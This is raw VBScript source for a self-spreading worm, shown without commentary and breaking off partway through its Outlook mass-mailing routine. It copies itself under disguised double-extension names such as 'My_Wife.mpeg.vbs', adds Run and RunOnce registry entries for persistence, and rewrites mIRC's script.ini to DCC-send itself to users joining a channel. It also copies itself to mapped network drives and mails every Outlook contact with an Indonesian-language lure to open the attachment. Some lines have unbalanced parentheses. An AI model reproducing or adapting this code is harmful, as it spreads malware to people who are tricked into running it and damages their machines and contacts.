   On Error Resume Next
   Set Fso = CreateObject("Scripting.FileSystemObject")
   Set Gf = Fso.GetFile(WScript.ScriptFullName)
   Set Ws = CreateObject("Wscript.Shell")
   Win = Fso.GetSpecialFolder(0)
   Sys = Fso.GetSpecialFolder(1)
   Startup = Ws.SpecialFolders("Startup")
   If Win & "\My_Wife.mpeg.vbs" <> "My_Wife.mpeg.vbs" Then
   Fso.CopyFile Gf, Win & "\My_Wife.mpeg.vbs"
   Fso.CopyFile Gf, Win & "\Triple-X.gif.vbs"
   Fso.CopyFile Gf, Win & "\Agnes_Monica.jpeg.vbs"
   Ws.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Media Player", "wscript.exe " & Win & "\My_Wife.mpeg.vbs"
   End If

   If Sys & "\My_Wife.mpeg.vbs" <> "My_Wife.mpeg.vbs" Then
   Fso.CopyFile Gf, Sys & "\My_Wife.mpeg.vbs"
   Fso.CopyFile Gf, Sys & "\Triple-X.gif.vbs"
   Fso.CopyFile Gf, Sys & "\Agnes_Monica.jpeg.vbs"
   Ws.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce\CPUopt", "wscript.exe " & Sys & "\Agnes_Monica.jpeg.vbs"
   End If

   If Startup & "\Agnes_Monica.jpeg.vbs" <> "Agnes_Monica.jpeg.vbs" Then
   Fso.CopyFile Gf, Startup & "\Agnes_Monica.jpeg.vbs"
   End If

   On Error Resume Next
   Set Fso = CreateObject("Scripting.FileSystemObject")
   Agnes = Fso.GetSpecialFolder(0) & "\Agnes_Monica.jpeg.vbs"
   if "c:\mirc" <> "" Then
   Set mIRC = Fso.CreateTextFile("c:\mirc\script.ini")
   mIRC.WriteLine "[script]" & vbCrLf
   mIRC.WriteLine "n0=On Join:#:if ($me != $nick) then {/dcc send (" & Agnes &")"
   mIRC.WriteLine "n1=On Connect"
   mIRC.WriteLine "n2=/clear"
   mIRC.WriteLine "n3=/motd"
   mIRC.WriteLine "n4=}"
   mIRC.Close
   End If

   if "c:\program files\mirc" <> "" Then
   Set mIRC = Fso.CreateTextFile("c:\program files\mirc\script.ini")
   mIRC.WriteLine "[script]" & vbCrLf
   mIRC.WriteLine "n0=On Join:#:if ($me != $nick) then {/dcc send (" & Agnes &")"
   mIRC.WriteLine "n1=On Connect"
   mIRC.WriteLine "n2=/clear"
   mIRC.WriteLine "n3=/motd"
   mIRC.WriteLine "n4=}"
   mIRC.Close
   End If

   On Error Resume Next
   Set Nw = CreateObject("WScript.Network")
   Set Gf = Fso.GetFile(Wscript.ScriptFullName)
   Set Nd = Nw.EnumNetworkDrives
   If Nd.Count <> 0 Then
   For Nk = 0 to Nd.Count - 1
   If InStr(Nd.Item(Nk), "\") <> 0 Then
   Fso.CopyFile Gf, Fso.BuildPath(Nd.Item(Nk), "My_Wife.mpeg.vbs"
   Fso.CopyFile Gf, Fso.BuildPath(Nd.Item(Nk), "Agnes_Monica.jpeg.vbs"
   End If
   Next
   End If

   On Error Resume Next
   Set OutlookApp = CreateObject("Outlook.Application")
   If Not OutlookApp = "" Then
   For Each ContactSwitch In OutlookApp.GetNameSpace("MAPI").AddressLists
   For UserGroup = 1 To ContactSwitch.AddressEntries.Count
   Set OutlookEmail = OutlookApp.CreateItem(0)
   OutlookEmail.Recipients.Add ContactSwitch.AddressEntries(UserGroup)
   OutlookEmail.Subject = "Exotic Girls..."
   OutlookEmail.Body = "Buka aja attachmentnya"& vbCrLf &"Gua yakin kalo loe pasti suka, dan ketagihan ..."& vbCrLf & vbCrLf & "Trim's" & vbCrLf & "Spidey"
